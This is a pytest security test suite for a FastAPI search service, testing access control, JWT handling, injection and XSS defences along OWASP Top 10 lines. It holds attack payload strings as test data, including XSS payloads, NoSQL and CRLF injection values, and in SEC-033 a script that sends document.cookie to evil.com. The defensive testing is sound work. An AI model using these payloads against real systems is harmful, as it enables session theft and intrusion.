"""
OWASP Top 10 Security Test Suite

Comprehensive security testing based on OWASP Top 10 2021:
- A01: Broken Access Control
- A02: Cryptographic Failures
- A03: Injection
- A07: Cross-Site Scripting (XSS)

STORY-055: Security Testing
Sprint: Sprint 04
Author: QA Agent
Priority: P0 Critical

Test Coverage:
- SEC-001 ~ SEC-010: A01 Broken Access Control (10 tests)
- SEC-011 ~ SEC-015: A02 Cryptographic Failures (5 tests)
- SEC-016 ~ SEC-025: A03 Injection (10 tests)
- SEC-026 ~ SEC-035: A07 XSS (10 tests)
Total: 35 test scenarios
"""

import json
import re
import sys
from datetime import datetime, timedelta
from pathlib import Path
from typing import Any, Dict, List
from unittest.mock import patch

import jwt
import pytest
from fastapi.testclient import TestClient

# Project root path setup
project_root = Path(__file__).parent.parent.parent.parent
sys.path.insert(0, str(project_root / "src"))

from app.core.config import settings
from app.main import app


# =============================================================================
# Custom Markers
# =============================================================================

pytestmark = [
    pytest.mark.security,
    pytest.mark.sprint04,
]


# =============================================================================
# A01: Broken Access Control Tests (SEC-001 ~ SEC-010)
# =============================================================================


class TestA01BrokenAccessControl:
    """OWASP A01: Broken Access Control Tests.

    Tests for authentication bypass, authorization failures,
    IDOR (Insecure Direct Object References), and privilege escalation.
    """

    @pytest.mark.owasp_a01
    @pytest.mark.p0
    def test_sec_001_unauthenticated_access_denied(
        self, client: TestClient, api_prefix: str
    ):
        """
        SEC-001: Unauthenticated requests to protected endpoints return 401.

        All protected API endpoints must reject requests without valid JWT.
        """
        protected_endpoints = [
            ("GET", f"{api_prefix}/auth/me"),
            ("POST", f"{api_prefix}/auth/logout"),
            ("POST", f"{api_prefix}/search/hybrid"),
            ("POST", f"{api_prefix}/search/semantic"),
            ("POST", f"{api_prefix}/search/keyword"),
            ("POST", f"{api_prefix}/search/chat/stream"),
        ]

        for method, path in protected_endpoints:
            if method == "GET":
                response = client.get(path)
            else:
                response = client.post(path, json={"query": "test", "top_k": 5})

            assert response.status_code == 401, (
                f"Unauthenticated {method} {path} should return 401, "
                f"got {response.status_code}"
            )

    @pytest.mark.owasp_a01
    @pytest.mark.p0
    def test_sec_002_expired_token_rejected(
        self, client: TestClient, api_prefix: str, expired_token: str
    ):
        """
        SEC-002: Expired JWT tokens are rejected with 401.

        Tokens past their expiration time must not grant access.
        """
        response = client.get(
            f"{api_prefix}/auth/me",
            headers={"Authorization": f"Bearer {expired_token}"},
        )

        assert response.status_code == 401, (
            f"Expired token should return 401, got {response.status_code}"
        )

    @pytest.mark.owasp_a01
    @pytest.mark.p0
    def test_sec_003_tampered_token_rejected(
        self, client: TestClient, api_prefix: str, tampered_token: str
    ):
        """
        SEC-003: Tampered (wrong signature) JWT tokens are rejected.

        Tokens signed with a different secret must be rejected.
        """
        response = client.get(
            f"{api_prefix}/auth/me",
            headers={"Authorization": f"Bearer {tampered_token}"},
        )

        assert response.status_code == 401, (
            f"Tampered token should return 401, got {response.status_code}"
        )

    @pytest.mark.owasp_a01
    @pytest.mark.p0
    def test_sec_004_none_algorithm_attack_blocked(
        self, client: TestClient, api_prefix: str, none_algorithm_token: str
    ):
        """
        SEC-004: JWT 'alg:none' attack is blocked.

        Tokens with algorithm set to 'none' must be rejected.
        This is a common JWT vulnerability (CVE-2015-9235).
        """
        response = client.get(
            f"{api_prefix}/auth/me",
            headers={"Authorization": f"Bearer {none_algorithm_token}"},
        )

        assert response.status_code == 401, (
            f"alg:none token should return 401, got {response.status_code}"
        )

    @pytest.mark.owasp_a01
    @pytest.mark.p0
    def test_sec_005_malformed_tokens_rejected(
        self, client: TestClient, api_prefix: str, malformed_tokens: List[str]
    ):
        """
        SEC-005: Malformed JWT tokens are rejected.

        Various malformed token formats must not crash the server
        and should return appropriate error codes.
        """
        for token in malformed_tokens:
            response = client.get(
                f"{api_prefix}/auth/me",
                headers={"Authorization": f"Bearer {token}"},
            )

            # Should be 401 (unauthorized) or 422 (validation error), not 500
            assert response.status_code < 500, (
                f"Malformed token '{token[:30]}...' caused server error: "
                f"{response.status_code}"
            )
            assert response.status_code in (401, 422), (
                f"Malformed token should return 401 or 422, got {response.status_code}"
            )

    @pytest.mark.owasp_a01
    @pytest.mark.p0
    def test_sec_006_invalid_auth_header_formats(
        self, client: TestClient, api_prefix: str
    ):
        """
        SEC-006: Invalid Authorization header formats are rejected.

        Various malformed Authorization headers must be handled properly.
        """
        invalid_headers = [
            {"Authorization": "Basic dXNlcjpwYXNz"},  # Wrong scheme
            {"Authorization": "Bearer"},  # Missing token
            {"Authorization": ""},  # Empty
            {"Authorization": "InvalidScheme token123"},  # Unknown scheme
            {"Authorization": "Bearer "},  # Space only after Bearer
            {"Authorization": "bearer token"},  # Lowercase bearer
            {"Authorization": "BEARER token"},  # Uppercase BEARER
        ]

        for headers in invalid_headers:
            response = client.get(
                f"{api_prefix}/auth/me",
                headers=headers,
            )

            assert response.status_code in (401, 403, 422), (
                f"Invalid auth header {headers} should be rejected, "
                f"got {response.status_code}"
            )

    @pytest.mark.owasp_a01
    @pytest.mark.p1
    def test_sec_007_token_with_future_iat_rejected(
        self, client: TestClient, api_prefix: str
    ):
        """
        SEC-007: Tokens with future 'iat' (issued-at) are suspicious.

        Tokens claiming to be issued in the future may indicate
        clock manipulation attacks.
        """
        from .conftest import JWT_SECRET_KEY, JWT_ALGORITHM

        # Token issued in the future
        payload = {
            "sub": "user-001",
            "email": "test@example.com",
            "role": "user",
            "exp": datetime.utcnow() + timedelta(hours=2),
            "iat": datetime.utcnow() + timedelta(hours=1),  # Future iat
            "type": "access",
        }
        future_iat_token = jwt.encode(payload, JWT_SECRET_KEY, algorithm=JWT_ALGORITHM)

        response = client.get(
            f"{api_prefix}/auth/me",
            headers={"Authorization": f"Bearer {future_iat_token}"},
        )

        # This may be accepted in permissive implementations
        # Document the actual behavior
        assert response.status_code < 500, (
            f"Future iat token should not crash server: {response.status_code}"
        )

    @pytest.mark.owasp_a01
    @pytest.mark.p1
    def test_sec_008_path_traversal_in_api_rejected(
        self, client: TestClient, api_prefix: str, path_traversal_payloads: List[str],
        auth_headers: Dict[str, str]
    ):
        """
        SEC-008: Path traversal attempts in API queries are blocked.

        Directory traversal patterns in search queries should not
        access unauthorized resources.
        """
        for payload in path_traversal_payloads:
            response = client.post(
                f"{api_prefix}/search/hybrid",
                json={"query": payload, "top_k": 5},
                headers=auth_headers,
            )

            # Should not cause server error
            assert response.status_code < 500, (
                f"Path traversal payload '{payload}' caused server error: "
                f"{response.status_code}"
            )

            # If successful, check response doesn't contain file contents
            if response.status_code == 200:
                response_text = json.dumps(response.json()).lower()
                assert "root:" not in response_text, (
                    f"Path traversal may have exposed /etc/passwd"
                )
                assert "administrator" not in response_text.lower(), (
                    f"Path traversal may have exposed Windows SAM"
                )

    @pytest.mark.owasp_a01
    @pytest.mark.p1
    def test_sec_009_internal_endpoints_not_exposed(
        self, client: TestClient
    ):
        """
        SEC-009: Internal API endpoints are not accessible externally.

        Internal service-to-service endpoints should not be exposed
        through the public API.
        """
        internal_paths = [
            "/internal/v1/search/hybrid",
            "/internal/v1/extract/entities",
            "/internal/v1/embed",
            "/internal/health",
            "/internal/metrics",
        ]

        for path in internal_paths:
            response = client.get(path)
            assert response.status_code in (401, 403, 404, 405), (
                f"Internal path {path} is accessible: {response.status_code}"
            )

    @pytest.mark.owasp_a01
    @pytest.mark.p1
    def test_sec_010_rate_limit_enforced_on_auth(
        self, client: TestClient, api_prefix: str
    ):
        """
        SEC-010: Rate limiting is enforced on authentication endpoints.

        Brute force attacks on login should be rate limited.
        """
        results = []
        for i in range(30):
            response = client.post(
                f"{api_prefix}/auth/login",
                json={
                    "email": f"attacker{i}@example.com",
                    "password": "wrongpassword",
                },
            )
            results.append(response.status_code)

        # All should be valid HTTP responses (not connection errors)
        for status in results:
            assert status < 600, f"Invalid HTTP status: {status}"

        # Document rate limiting behavior
        # In mock mode, rate limiter may not be active
        status_codes = set(results)
        if 429 in status_codes:
            # Rate limiting is active
            first_429_idx = results.index(429)
            assert first_429_idx > 0, (
                "Rate limit should allow some requests before blocking"
            )


# =============================================================================
# A02: Cryptographic Failures Tests (SEC-011 ~ SEC-015)
# =============================================================================


class TestA02CryptographicFailures:
    """OWASP A02: Cryptographic Failures Tests.

    Tests for weak secrets, sensitive data exposure,
    and cryptographic implementation flaws.
    """

    @pytest.mark.owasp_a02
    @pytest.mark.p0
    def test_sec_011_jwt_secret_not_hardcoded_in_production(self):
        """
        SEC-011: JWT secret should use environment variable in production.

        Hardcoded secrets in source code are a critical vulnerability.
        In production, JWT_SECRET must come from environment variables.
        """
        from app.api.routes.auth import JWT_SECRET_KEY as current_secret

        # Check if the current secret is the default hardcoded value
        default_secret = "knowledge-service-secret-key-change-in-production"

        if current_secret == default_secret:
            # This is expected in development/test environment
            # In production, this should be overridden by env var
            import os
            env_secret = os.getenv("JWT_SECRET_KEY")

            if os.getenv("ENVIRONMENT", "development") == "production":
                assert env_secret is not None, (
                    "JWT_SECRET_KEY environment variable must be set in production"
                )
                pytest.fail(
                    "Production environment using hardcoded JWT secret. "
                    "Set JWT_SECRET_KEY environment variable."
                )

    @pytest.mark.owasp_a02
    @pytest.mark.p0
    def test_sec_012_jwt_secret_minimum_length(self):
        """
        SEC-012: JWT secret must be at least 32 characters.

        Short secrets are vulnerable to brute force attacks.
        HS256 requires a secret of at least 256 bits (32 bytes).
        """
        from app.api.routes.auth import JWT_SECRET_KEY as current_secret

        secret_length = len(current_secret)

        # HS256 requires 256 bits = 32 bytes minimum
        assert secret_length >= 32, (
            f"JWT secret is only {secret_length} chars. "
            f"Minimum 32 characters required for HS256."
        )

    @pytest.mark.owasp_a02
    @pytest.mark.p0
    def test_sec_013_passwords_not_in_response(
        self, client: TestClient, api_prefix: str
    ):
        """
        SEC-013: User passwords are never returned in API responses.

        Password hashes and plaintext passwords must never be
        exposed in any API response.
        """
        # Login to get a valid session
        response = client.post(
            f"{api_prefix}/auth/login",
            json={"email": "test@example.com", "password": "password123"},
        )

        response_text = json.dumps(response.json()).lower()

        # Should not contain password patterns
        assert "password123" not in response_text, (
            "Plaintext password found in login response"
        )
        assert "password_hash" not in response_text, (
            "Password hash field found in response"
        )

        # If login successful, check /me endpoint too
        if response.status_code == 200:
            token = response.json().get("accessToken") or response.json().get("access_token")
            if token:
                me_response = client.get(
                    f"{api_prefix}/auth/me",
                    headers={"Authorization": f"Bearer {token}"},
                )
                me_text = json.dumps(me_response.json()).lower()
                assert "password" not in me_text, (
                    "Password field found in /me response"
                )

    @pytest.mark.owasp_a02
    @pytest.mark.p1
    def test_sec_014_sensitive_data_not_in_error_responses(
        self, client: TestClient, api_prefix: str,
        sensitive_data_patterns: List[str]
    ):
        """
        SEC-014: Error responses do not leak sensitive information.

        Error messages should not contain secrets, stack traces,
        database errors, or internal implementation details.
        """
        # Trigger various error conditions
        error_requests = [
            ("GET", f"{api_prefix}/auth/me", {}),  # No auth
            ("POST", f"{api_prefix}/search/hybrid", {"query": "", "top_k": 5}),  # Empty query
            ("GET", f"{api_prefix}/nonexistent", {}),  # 404
        ]

        for method, path, body in error_requests:
            if method == "GET":
                response = client.get(path)
            else:
                response = client.post(path, json=body)

            if response.status_code >= 400:
                response_text = response.text.lower()

                # Check for sensitive patterns
                dangerous_patterns = [
                    "traceback",
                    "stack trace",
                    "internal server",
                    "exception",
                    "sql",
                    "database",
                    "connection string",
                ]
                for pattern in dangerous_patterns:
                    assert pattern not in response_text, (
                        f"Error response contains sensitive info: '{pattern}'"
                    )

    @pytest.mark.owasp_a02
    @pytest.mark.p1
    def test_sec_015_response_headers_security(
        self, client: TestClient, api_prefix: str, auth_headers: Dict[str, str]
    ):
        """
        SEC-015: Security headers are present in responses.

        Responses should include security headers to prevent
        common attacks (XSS, clickjacking, MIME sniffing).
        """
        response = client.post(
            f"{api_prefix}/search/hybrid",
            json={"query": "test query", "top_k": 5},
            headers=auth_headers,
        )

        headers = response.headers

        # Content-Type should be application/json (not text/html)
        content_type = headers.get("content-type", "")
        assert "application/json" in content_type, (
            f"Response Content-Type should be JSON, got: {content_type}"
        )

        # Optional security headers (document presence)
        security_headers = [
            ("X-Content-Type-Options", "nosniff"),
            ("X-Frame-Options", "DENY"),
            ("X-XSS-Protection", "1; mode=block"),
        ]

        for header_name, expected_value in security_headers:
            actual = headers.get(header_name)
            if actual:
                # Header is present, verify value
                pass  # Document that it's present


# =============================================================================
# A03: Injection Tests (SEC-016 ~ SEC-025)
# =============================================================================


class TestA03Injection:
    """OWASP A03: Injection Tests.

    Tests for SQL injection, NoSQL injection, command injection,
    and other injection vulnerabilities.
    """

    @pytest.mark.owasp_a03
    @pytest.mark.p0
    def test_sec_016_sql_injection_in_search(
        self, client: TestClient, api_prefix: str,
        sql_injection_payloads: List[str], auth_headers: Dict[str, str]
    ):
        """
        SEC-016: SQL injection payloads in search are handled safely.

        SQL injection attempts in search queries should not execute
        and should not cause server errors.
        """
        for payload in sql_injection_payloads:
            response = client.post(
                f"{api_prefix}/search/hybrid",
                json={"query": payload, "top_k": 5},
                headers=auth_headers,
            )

            # Should not cause server error
            assert response.status_code < 500, (
                f"SQL injection '{payload}' caused server error: "
                f"{response.status_code}"
            )

    @pytest.mark.owasp_a03
    @pytest.mark.p0
    def test_sec_017_no_sql_error_messages_leaked(
        self, client: TestClient, api_prefix: str,
        sql_injection_payloads: List[str], auth_headers: Dict[str, str]
    ):
        """
        SEC-017: SQL error messages are not leaked in responses.

        Even if SQL injection is attempted, database error messages
        should not be exposed to the attacker.
        """
        sql_error_patterns = [
            r"syntax error",
            r"sql.*error",
            r"pg_catalog",
            r"column.*does.*not.*exist",
            r"relation.*does.*not.*exist",
            r"permission denied",
            r"mysql.*error",
            r"ora-\d+",
            r"sqlite.*error",
        ]

        for payload in sql_injection_payloads:
            response = client.post(
                f"{api_prefix}/search/hybrid",
                json={"query": payload, "top_k": 5},
                headers=auth_headers,
            )

            response_text = response.text.lower()
            for pattern in sql_error_patterns:
                assert not re.search(pattern, response_text), (
                    f"SQL error pattern '{pattern}' leaked for payload '{payload}'"
                )

    @pytest.mark.owasp_a03
    @pytest.mark.p0
    def test_sec_018_sql_injection_in_login(
        self, client: TestClient, api_prefix: str,
        sql_injection_payloads: List[str]
    ):
        """
        SEC-018: SQL injection in login credentials is blocked.

        SQL injection attempts in email/password fields should not
        bypass authentication.
        """
        for payload in sql_injection_payloads:
            # Test SQL injection in email field
            response = client.post(
                f"{api_prefix}/auth/login",
                json={"email": payload + "@example.com", "password": "password"},
            )

            # Should be 401 (auth failed) or 422 (validation), not 200
            assert response.status_code != 200, (
                f"SQL injection in email may have bypassed auth: '{payload}'"
            )
            assert response.status_code < 500, (
                f"SQL injection in email caused server error: {response.status_code}"
            )

            # Test SQL injection in password field
            response = client.post(
                f"{api_prefix}/auth/login",
                json={"email": "test@example.com", "password": payload},
            )

            # Password validation may fail (min length 6)
            # But should not cause 500 error
            assert response.status_code < 500, (
                f"SQL injection in password caused server error: {response.status_code}"
            )

    @pytest.mark.owasp_a03
    @pytest.mark.p1
    def test_sec_019_nosql_injection_blocked(
        self, client: TestClient, api_prefix: str,
        auth_headers: Dict[str, str]
    ):
        """
        SEC-019: NoSQL injection payloads are blocked.

        MongoDB/NoSQL injection operators should not be processed.
        """
        nosql_payloads = [
            '{"$gt": ""}',
            '{"$ne": null}',
            '{"$where": "1==1"}',
        ]

        for payload in nosql_payloads:
            response = client.post(
                f"{api_prefix}/search/hybrid",
                json={"query": payload, "top_k": 5},
                headers=auth_headers,
            )

            assert response.status_code < 500, (
                f"NoSQL injection '{payload}' caused server error"
            )

    @pytest.mark.owasp_a03
    @pytest.mark.p1
    def test_sec_020_command_injection_blocked(
        self, client: TestClient, api_prefix: str,
        command_injection_payloads: List[str], auth_headers: Dict[str, str]
    ):
        """
        SEC-020: OS command injection payloads are blocked.

        Shell command injection attempts should not execute.
        """
        for payload in command_injection_payloads:
            response = client.post(
                f"{api_prefix}/search/hybrid",
                json={"query": payload, "top_k": 5},
                headers=auth_headers,
            )

            assert response.status_code < 500, (
                f"Command injection '{payload}' caused server error"
            )

            # Check response doesn't contain command output
            if response.status_code == 200:
                response_text = response.text.lower()
                dangerous_outputs = ["root:", "uid=", "gid=", "groups="]
                for output in dangerous_outputs:
                    assert output not in response_text, (
                        f"Command injection may have executed: '{output}' in response"
                    )

    @pytest.mark.owasp_a03
    @pytest.mark.p1
    def test_sec_021_ldap_injection_blocked(
        self, client: TestClient, api_prefix: str,
        ldap_injection_payloads: List[str], auth_headers: Dict[str, str]
    ):
        """
        SEC-021: LDAP injection payloads are handled safely.

        LDAP injection attempts should not be processed.
        """
        for payload in ldap_injection_payloads:
            response = client.post(
                f"{api_prefix}/search/hybrid",
                json={"query": payload, "top_k": 5},
                headers=auth_headers,
            )

            assert response.status_code < 500, (
                f"LDAP injection '{payload}' caused server error"
            )

    @pytest.mark.owasp_a03
    @pytest.mark.p1
    def test_sec_022_json_injection_blocked(
        self, client: TestClient, api_prefix: str, auth_headers: Dict[str, str]
    ):
        """
        SEC-022: JSON injection payloads are handled safely.

        Malformed JSON and JSON injection attempts should not crash.
        """
        json_payloads = [
            '{"query": "test", "__proto__": {"admin": true}}',
            '{"query": "test", "constructor": {"prototype": {"admin": true}}}',
        ]

        for payload_str in json_payloads:
            try:
                payload = json.loads(payload_str)
                payload["top_k"] = 5
                response = client.post(
                    f"{api_prefix}/search/hybrid",
                    json=payload,
                    headers=auth_headers,
                )

                assert response.status_code < 500, (
                    f"JSON injection caused server error"
                )
            except json.JSONDecodeError:
                pass  # Invalid JSON is fine

    @pytest.mark.owasp_a03
    @pytest.mark.p1
    def test_sec_023_header_injection_blocked(
        self, client: TestClient, api_prefix: str, auth_headers: Dict[str, str]
    ):
        """
        SEC-023: HTTP header injection is blocked.

        CRLF injection in headers should not be processed.
        """
        injection_headers = {
            **auth_headers,
            "X-Custom-Header": "value\r\nX-Injected: malicious",
        }

        response = client.post(
            f"{api_prefix}/search/hybrid",
            json={"query": "test", "top_k": 5},
            headers=injection_headers,
        )

        assert response.status_code < 500, (
            "Header injection caused server error"
        )

    @pytest.mark.owasp_a03
    @pytest.mark.p2
    def test_sec_024_unicode_normalization_attack(
        self, client: TestClient, api_prefix: str, auth_headers: Dict[str, str]
    ):
        """
        SEC-024: Unicode normalization attacks are handled.

        Different Unicode representations of the same character
        should be normalized consistently.
        """
        unicode_payloads = [
            "admin\u0000istrator",  # Null byte
            "admin\ufeffistrator",  # BOM
            "a\u0301dmin",  # Combining character
            "\u0061\u0064\u006d\u0069\u006e",  # Spelled out "admin"
        ]

        for payload in unicode_payloads:
            response = client.post(
                f"{api_prefix}/search/hybrid",
                json={"query": payload, "top_k": 5},
                headers=auth_headers,
            )

            assert response.status_code < 500, (
                f"Unicode payload '{repr(payload)}' caused server error"
            )

    @pytest.mark.owasp_a03
    @pytest.mark.p2
    def test_sec_025_oversized_input_handled(
        self, client: TestClient, api_prefix: str, auth_headers: Dict[str, str]
    ):
        """
        SEC-025: Oversized input is rejected gracefully.

        Very large inputs should be rejected without causing
        memory exhaustion or denial of service.
        """
        # Test query length limits
        oversized_queries = [
            "A" * 1001,  # Just over 1000 char limit
            "A" * 10000,  # 10x over limit
            "A" * 100000,  # 100x over limit
        ]

        for query in oversized_queries:
            response = client.post(
                f"{api_prefix}/search/hybrid",
                json={"query": query, "top_k": 5},
                headers=auth_headers,
            )

            # Should be rejected (400/422), not server error
            assert response.status_code in (400, 422, 413), (
                f"Oversized input ({len(query)} chars) returned unexpected "
                f"status: {response.status_code}"
            )


# =============================================================================
# A07: Cross-Site Scripting (XSS) Tests (SEC-026 ~ SEC-035)
# =============================================================================


class TestA07CrossSiteScripting:
    """OWASP A07: Cross-Site Scripting (XSS) Tests.

    Tests for reflected XSS, stored XSS, and DOM-based XSS
    prevention in API responses.
    """

    @pytest.mark.owasp_a07
    @pytest.mark.p0
    def test_sec_026_script_tag_xss_handled(
        self, client: TestClient, api_prefix: str, auth_headers: Dict[str, str]
    ):
        """
        SEC-026: <script> tag XSS payloads are handled safely.

        Script tags in input should not appear in response content
        (except in the echoed query field which is safe due to JSON Content-Type).
        """
        xss_query = "<script>alert('xss')</script>"

        response = client.post(
            f"{api_prefix}/search/hybrid",
            json={"query": xss_query, "top_k": 5},
            headers=auth_headers,
        )

        assert response.status_code < 500, (
            f"XSS payload caused server error: {response.status_code}"
        )

        if response.status_code == 200:
            data = response.json()
            # Check results field (not query echo)
            results_text = json.dumps(
                {k: v for k, v in data.items() if k != "query"}
            ).lower()

            assert "<script>" not in results_text, (
                "Script tag found in results (not query echo)"
            )

    @pytest.mark.owasp_a07
    @pytest.mark.p0
    def test_sec_027_event_handler_xss_handled(
        self, client: TestClient, api_prefix: str, auth_headers: Dict[str, str]
    ):
        """
        SEC-027: Event handler XSS payloads are handled safely.

        HTML event handlers (onerror, onload, etc.) should not
        appear in response content.
        """
        event_handler_payloads = [
            '<img onerror="alert(1)" src=x>',
            '<div onmouseover="alert(1)">hover</div>',
            '<body onload="alert(1)">',
            '<input onfocus=alert(1) autofocus>',
        ]

        for payload in event_handler_payloads:
            response = client.post(
                f"{api_prefix}/search/hybrid",
                json={"query": payload, "top_k": 5},
                headers=auth_headers,
            )

            assert response.status_code < 500, (
                f"Event handler XSS '{payload}' caused server error"
            )

            if response.status_code == 200:
                data = response.json()
                results_text = json.dumps(
                    {k: v for k, v in data.items() if k != "query"}
                ).lower()

                assert 'onerror=' not in results_text
                assert 'onmouseover=' not in results_text
                assert 'onload=' not in results_text
                assert 'onfocus=' not in results_text

    @pytest.mark.owasp_a07
    @pytest.mark.p0
    def test_sec_028_javascript_uri_xss_handled(
        self, client: TestClient, api_prefix: str, auth_headers: Dict[str, str]
    ):
        """
        SEC-028: JavaScript URI XSS payloads are handled safely.

        javascript: URIs should not appear in response content.
        """
        js_uri_payloads = [
            '<a href="javascript:alert(1)">click</a>',
            "javascript:alert(document.cookie)",
            '<iframe src="javascript:alert(1)">',
        ]

        for payload in js_uri_payloads:
            response = client.post(
                f"{api_prefix}/search/hybrid",
                json={"query": payload, "top_k": 5},
                headers=auth_headers,
            )

            assert response.status_code < 500, (
                f"JavaScript URI XSS '{payload}' caused server error"
            )

            if response.status_code == 200:
                data = response.json()
                results_text = json.dumps(
                    {k: v for k, v in data.items() if k != "query"}
                ).lower()

                assert 'javascript:' not in results_text

    @pytest.mark.owasp_a07
    @pytest.mark.p0
    def test_sec_029_svg_xss_handled(
        self, client: TestClient, api_prefix: str, auth_headers: Dict[str, str]
    ):
        """
        SEC-029: SVG-based XSS payloads are handled safely.

        SVG elements with script content should not execute.
        """
        svg_payloads = [
            '<svg onload="alert(1)">test</svg>',
            '<svg><script>alert(1)</script></svg>',
            '<svg><animate onbegin=alert(1)>',
        ]

        for payload in svg_payloads:
            response = client.post(
                f"{api_prefix}/search/hybrid",
                json={"query": payload, "top_k": 5},
                headers=auth_headers,
            )

            assert response.status_code < 500, (
                f"SVG XSS '{payload}' caused server error"
            )

    @pytest.mark.owasp_a07
    @pytest.mark.p0
    def test_sec_030_response_content_type_is_json(
        self, client: TestClient, api_prefix: str, auth_headers: Dict[str, str]
    ):
        """
        SEC-030: Response Content-Type is application/json.

        JSON Content-Type prevents browsers from executing
        embedded scripts, even if XSS payloads are echoed.
        """
        xss_query = "<script>alert('xss')</script>"

        response = client.post(
            f"{api_prefix}/search/hybrid",
            json={"query": xss_query, "top_k": 5},
            headers=auth_headers,
        )

        if response.status_code == 200:
            content_type = response.headers.get("content-type", "")
            assert "application/json" in content_type, (
                f"Content-Type should be JSON to prevent XSS, got: {content_type}"
            )

    @pytest.mark.owasp_a07
    @pytest.mark.p1
    def test_sec_031_all_xss_payloads_handled(
        self, client: TestClient, api_prefix: str,
        xss_payloads: List[str], auth_headers: Dict[str, str]
    ):
        """
        SEC-031: All XSS payload variations are handled safely.

        Comprehensive XSS payload testing - none should crash the server.
        """
        for payload in xss_payloads:
            response = client.post(
                f"{api_prefix}/search/hybrid",
                json={"query": payload, "top_k": 5},
                headers=auth_headers,
            )

            assert response.status_code < 500, (
                f"XSS payload '{payload[:50]}...' caused server error: "
                f"{response.status_code}"
            )

    @pytest.mark.owasp_a07
    @pytest.mark.p1
    def test_sec_032_xss_filter_evasion_handled(
        self, client: TestClient, api_prefix: str,
        xss_filter_evasion_payloads: List[str], auth_headers: Dict[str, str]
    ):
        """
        SEC-032: XSS filter evasion techniques are handled.

        Obfuscated and encoded XSS payloads should also be safe.
        """
        for payload in xss_filter_evasion_payloads:
            # Clean null bytes which may cause JSON issues
            clean_payload = payload.replace("\x00", "")
            if not clean_payload.strip():
                continue

            response = client.post(
                f"{api_prefix}/search/hybrid",
                json={"query": clean_payload, "top_k": 5},
                headers=auth_headers,
            )

            assert response.status_code < 500, (
                f"XSS evasion payload '{repr(clean_payload[:30])}' caused error"
            )

    @pytest.mark.owasp_a07
    @pytest.mark.p1
    def test_sec_033_xss_in_chat_endpoint(
        self, client: TestClient, api_prefix: str, auth_headers: Dict[str, str]
    ):
        """
        SEC-033: XSS payloads in chat endpoint are handled safely.

        The RAG chat endpoint should also sanitize XSS payloads.
        """
        xss_query = '<script>fetch("http://evil.com/steal?c="+document.cookie)</script>'

        response = client.post(
            f"{api_prefix}/search/chat",
            json={"query": xss_query, "top_k": 5},
            headers=auth_headers,
        )

        assert response.status_code < 500, (
            f"XSS in chat caused server error: {response.status_code}"
        )

        if response.status_code == 200:
            data = response.json()
            answer = data.get("answer", "").lower()
            assert "<script>" not in answer, (
                "Chat answer contains <script> tag"
            )

    @pytest.mark.owasp_a07
    @pytest.mark.p1
    def test_sec_034_xss_in_error_messages(
        self, client: TestClient, api_prefix: str, auth_headers: Dict[str, str]
    ):
        """
        SEC-034: XSS payloads are not reflected in error messages.

        Error responses should not reflect user input unsanitized.
        """
        xss_query = "<script>alert(1)</script>"

        # Trigger validation error with XSS payload
        response = client.post(
            f"{api_prefix}/search/hybrid",
            json={"query": xss_query, "top_k": -1},  # Invalid top_k
            headers=auth_headers,
        )

        if response.status_code >= 400:
            error_text = response.text.lower()
            assert "<script>" not in error_text, (
                "XSS payload reflected in error message"
            )

    @pytest.mark.owasp_a07
    @pytest.mark.p1
    def test_sec_035_application_functional_after_xss_attempts(
        self, client: TestClient, api_prefix: str,
        xss_payloads: List[str], auth_headers: Dict[str, str]
    ):
        """
        SEC-035: Application remains functional after XSS attempts.

        After processing XSS payloads, normal requests should still work.
        """
        # Send all XSS payloads
        for payload in xss_payloads:
            client.post(
                f"{api_prefix}/search/hybrid",
                json={"query": payload, "top_k": 5},
                headers=auth_headers,
            )

        # Verify normal operation
        response = client.post(
            f"{api_prefix}/search/hybrid",
            json={"query": "RAG 시스템 동작 원리", "top_k": 5},
            headers=auth_headers,
        )

        assert response.status_code == 200, (
            f"App not functional after XSS attempts: {response.status_code}"
        )


# =============================================================================
# Test Execution
# =============================================================================


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short", "-m", "security"])
